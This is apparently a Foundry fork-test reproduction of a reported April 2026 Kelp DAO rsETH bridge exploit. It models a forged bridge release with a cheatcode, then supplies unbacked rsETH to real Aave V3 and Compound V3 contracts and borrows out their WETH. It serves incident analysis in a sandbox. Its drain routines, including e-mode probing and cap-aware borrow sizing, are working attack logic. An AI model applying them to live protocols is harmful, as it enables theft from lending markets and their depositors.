// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IERC20, IAavePool, IAaveOracle, IComet, IAaveDataProvider, IAToken} from "../src/Interfaces.sol";

/// @notice Reproduction of the on-chain, economically-real portion of the
/// Kelp DAO rsETH bridge exploit (2026-04-18) on a mainnet fork.
///
/// IMPORTANT: what this does and does NOT model:
///  - The real root cause was OFF-CHAIN: Lazarus compromised LayerZero's 1-of-1
///    DVN servers and force-fed a FORGED cross-chain message. On-chain the
///    forged `lzReceive()` looked perfectly valid, so there is no buggy contract
///    to "replay". We MODEL that forged release with a cheatcode that hands the
///    attacker 116,500 unbacked rsETH (see `_modelForgedRelease`).
///  - Everything AFTER that is real and executed against live mainnet contracts:
///    supplying rsETH as collateral to Aave V3 and Compound V3 and borrowing WETH.
contract KelpDrainForkTest is Test {
    // --- Real mainnet addresses ---
    address constant rsETH   = 0xA1290d69c65A6Fe4DF752f95823fae25cB99e5A7;
    address constant WETH    = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant AAVE_POOL   = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant AAVE_ORACLE = 0x54586bE62E3c3580375aE3723C145253060Ca0C2;
    address constant WETH_ATOKEN = 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8; // aEthWETH
    address constant RSETH_ATOKEN= 0x2D62109243b87C4bA3EE7bA1D91B0dD0A074d7b1; // aEthrsETH
    address constant AAVE_DP     = 0x497a1994c46d4f6C864904A9f1fac6328Cb7C8a6; // Aave V3 ProtocolDataProvider
    address constant COMET_WETH  = 0xA17581A9E3356d9A858b789D68B4d866e593aE94; // Compound V3 WETH market

    // Incident sizing (from the diagram / public reporting)
    uint256 constant STOLEN_RSETH   = 116_500 ether;
    uint256 constant AAVE_ALLOC     = 89_567 ether;
    uint256 constant COMPOUND_ALLOC = 18_000 ether;
    // (9,000 rsETH went to Euler in the real event; omitted here for brevity)

    address attacker = makeAddr("lazarus");

    function setUp() public {
        // Fork just before the incident block (2026-04-18 ~09:57 UTC).
        vm.createSelectFork(vm.rpcUrl("mainnet"), 24_900_000);
    }

    function test_ReproduceDrain() public {
        console2.log("==================================================================");
        console2.log(" Kelp DAO rsETH bridge exploit - mainnet fork reproduction");
        console2.log(" Fork block: 24,900,000  (2026-04-18, pre-incident state)");
        console2.log("==================================================================");

        uint256 ethPrice = IAaveOracle(AAVE_ORACLE).getAssetPrice(WETH); // USD, 8 decimals
        console2.log("Live WETH/USD price (Aave oracle, 8dp): %s", ethPrice);

        // ---- Step 1: model the forged bridge release ----
        _modelForgedRelease(attacker, STOLEN_RSETH);
        console2.log("");
        console2.log("[1] Forged 1/1-DVN release modeled:");
        console2.log("    attacker rsETH balance = %s rsETH", _fmt(IERC20(rsETH).balanceOf(attacker)));

        uint256 totalWethOut;

        // ---- Step 2: drain Aave V3 ----
        totalWethOut += _drainAave(AAVE_ALLOC);

        // ---- Step 3: drain Compound V3 ----
        totalWethOut += _drainCompound(COMPOUND_ALLOC);

        // ---- Tally ----
        uint256 usdOut = (totalWethOut * ethPrice) / 1e8; // 1e18 * 1e8 / 1e8 = 1e18 scaled USD
        console2.log("");
        console2.log("==================================================================");
        console2.log(" TOTAL WETH extracted : %s WETH", _fmt(totalWethOut));
        console2.log(" Approx USD value     : $%s", _fmt(usdOut));
        console2.log("==================================================================");

        assertGt(totalWethOut, 0, "no value extracted");
    }

    // --- helpers ---

    function _drainAave(uint256 rsAmountWanted) internal returns (uint256 borrowed) {
        // Real Aave supply cap constrains how much rsETH can be posted as collateral.
        (, uint256 supplyCap) = IAaveDataProvider(AAVE_DP).getReserveCaps(rsETH); // whole tokens
        uint256 current = IAToken(RSETH_ATOKEN).totalSupply();
        uint256 headroom = supplyCap * 1e18 > current ? supplyCap * 1e18 - current : 0;
        uint256 rsAmount = rsAmountWanted < (headroom * 99) / 100 ? rsAmountWanted : (headroom * 99) / 100;

        vm.startPrank(attacker);
        IERC20(rsETH).approve(AAVE_POOL, rsAmount);
        IAavePool(AAVE_POOL).supply(rsETH, rsAmount, attacker, 0);

        // rsETH base LTV is 0 on mainnet Aave: it is suppliable and counts for
        // liquidation, but cannot be borrowed against and cannot even be enabled
        // as collateral (UserInIsolationModeOrLtvZero) UNTIL an ETH-correlated
        // e-mode raises its effective LTV. Probe categories, keep the best one.
        uint8 bestCat;
        uint256 bestAvail;
        for (uint8 c = 1; c <= 8; c++) {
            try IAavePool(AAVE_POOL).setUserEMode(c) {
                try IAavePool(AAVE_POOL).setUserUseReserveAsCollateral(rsETH, true) {} catch {}
                (, , uint256 a, , , ) = IAavePool(AAVE_POOL).getUserAccountData(attacker);
                if (a > bestAvail) {
                    bestAvail = a;
                    bestCat = c;
                }
            } catch {}
        }
        IAavePool(AAVE_POOL).setUserEMode(bestCat);
        try IAavePool(AAVE_POOL).setUserUseReserveAsCollateral(rsETH, true) {} catch {}

        (, , uint256 availUsd, , uint256 ltv, ) = IAavePool(AAVE_POOL).getUserAccountData(attacker);
        uint256 ethPrice = IAaveOracle(AAVE_ORACLE).getAssetPrice(WETH);
        // available borrow (USD 8dp) -> WETH (1e18), leave 1% margin for rounding
        uint256 wantWeth = (availUsd * 1e18 * 99) / (ethPrice * 100);
        // cap by actual WETH liquidity available in the reserve
        uint256 liquidity = IERC20(WETH).balanceOf(WETH_ATOKEN);
        uint256 borrowAmt = wantWeth < (liquidity * 98) / 100 ? wantWeth : (liquidity * 98) / 100;

        if (borrowAmt > 0) {
            IAavePool(AAVE_POOL).borrow(WETH, borrowAmt, 2, 0, attacker);
        }
        borrowed = IERC20(WETH).balanceOf(attacker);
        vm.stopPrank();

        console2.log("");
        console2.log("[2] Aave V3 drain:");
        console2.log("    rsETH supply cap       = %s rsETH", supplyCap);
        console2.log("    cap headroom available = %s rsETH", _fmt(headroom));
        console2.log("    supplied collateral    = %s rsETH", _fmt(rsAmount));
        console2.log("    e-mode category used   = %s", bestCat);
        console2.log("    effective LTV (bps)    = %s", ltv);
        console2.log("    WETH reserve liquidity = %s WETH", _fmt(liquidity));
        console2.log("    WETH borrowed          = %s WETH", _fmt(borrowed));
    }

    function _drainCompound(uint256 rsAmountWanted) internal returns (uint256 borrowed) {
        // Compound WETH market also caps rsETH collateral.
        IComet.AssetInfo memory info = IComet(COMET_WETH).getAssetInfoByAddress(rsETH);
        (uint128 currentColl, ) = IComet(COMET_WETH).totalsCollateral(rsETH);
        uint256 headroom = uint256(info.supplyCap) > currentColl ? uint256(info.supplyCap) - currentColl : 0;
        uint256 rsAmount = rsAmountWanted < (headroom * 99) / 100 ? rsAmountWanted : (headroom * 99) / 100;

        uint256 before = IERC20(WETH).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(rsETH).approve(COMET_WETH, rsAmount);
        IComet(COMET_WETH).supply(rsETH, rsAmount);

        // Borrow (withdraw base) a safe fraction of collateral value.
        // rsETH ~ 1.03 ETH, borrowCF 0.90 -> ~0.9x notional; use 0.85x for margin.
        uint256 liquidity = IERC20(WETH).balanceOf(COMET_WETH);
        uint256 want = (rsAmount * 85) / 100;
        uint256 borrowAmt = want < (liquidity * 98) / 100 ? want : (liquidity * 98) / 100;
        IComet(COMET_WETH).withdraw(WETH, borrowAmt);
        vm.stopPrank();

        borrowed = IERC20(WETH).balanceOf(attacker) - before;
        console2.log("");
        console2.log("[3] Compound V3 (WETH market) drain:");
        console2.log("    rsETH supply cap      = %s rsETH", _fmt(uint256(info.supplyCap)));
        console2.log("    cap headroom available= %s rsETH", _fmt(headroom));
        console2.log("    supplied collateral   = %s rsETH", _fmt(rsAmount));
        console2.log("    WETH market liquidity = %s WETH", _fmt(liquidity));
        console2.log("    WETH borrowed         = %s WETH", _fmt(borrowed));
    }

    /// @dev Stand-in for the off-chain-forged, on-chain-valid bridge release.
    /// Uses the ERC20 storage-writing cheatcode to grant unbacked rsETH.
    function _modelForgedRelease(address to, uint256 amount) internal {
        deal(rsETH, to, amount);
    }

    /// @dev format a 1e18 fixed-point number as an integer (whole units) for logs
    function _fmt(uint256 x) internal pure returns (uint256) {
        return x / 1e18;
    }
}
